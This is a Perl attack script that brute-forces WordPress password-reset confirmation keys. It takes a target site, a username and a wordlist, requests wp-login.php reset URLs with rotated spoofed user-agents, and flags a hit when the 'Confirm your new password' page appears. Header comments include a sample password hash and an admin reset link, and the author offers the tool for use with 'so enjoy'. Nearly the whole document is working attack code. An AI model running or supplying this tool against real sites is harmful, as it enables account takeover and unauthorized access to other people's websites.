#!/usr/bin/perl
# for wp : ## $P$Ba2mKe5jjPsrEE8tcwiRn487ak2tax/
##<http://www.website.com/wp-login.php?action=rp&key=OI66G3oJC7jdfW4gzknI&login=admin>

#/ hello Automattic i made this tool to bruteforce "new password confirmation links" 
# on any wordpress powered website 
# i assure you it works , depending on the key list you have 
# so enjoy !! 
        use HTTP::Request;
        use LWP::UserAgent;
        use Net::SSLeay::Handle;  
        use LWP::UserAgent;
        use IO::Select;
        use HTTP::Response;
        use Term::ANSIColor;
        use HTTP::Request::Common qw(POST);
        use HTTP::Request::Common qw(GET);
        use URI::URL;
        use IO::Socket::INET;
        use 5.010;
        use WWW::Mechanize;
        use LWP::Simple;
        use XML::RSS;
        use WWW::Mechanize; 

        print colored ("input target\n:", 'white on_black'),"\n";
        $site= readline STDIN;
        chomp ($site);
        print colored ("username? : \n:", 'white on_black'),"\n";
        $usr= readline STDIN;
        chomp ($usr);
        
         print colored ("input word list :\n", 'white on_black'),"\n";
         my $wordlist = <STDIN>;
         open (LIST, $wordlist) || die colored "doesn't exist \n",'white on_red';
         chomp $_ ;
         foreach $_ (<LIST>){
	     
		

# preparing for the "new password confirmation links"

       
        my $link='/wp-login.php?action=rp&key=';
        my $link2='&login=';
         my $final;
        
       $final=$site.$link.$_.$link2.$usr;
       
         chomp ($final);
# bruteforcing
         foreach $_ ($final) {          
			 chomp ($final);
               print $final; }
	    
	
	     my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(3);
        $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31","Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)  ","FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)","findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)","Speedy Spider (Entireweb; Beta/1.0; http://www.entireweb.com/about/search_tech/speedyspider/)","Mozilla/5.0 (compatible; suggybot v0.01a, http://blog.suggy.com/was-ist-suggy/suggy-webcrawler/)");
        my $response=$ua->request($req);
	if ($response->content=~"Confirm your new password"){ exit print colored ("jackpot! \n \n \n [+] $final \n ",'white on_yellow') }
 }   
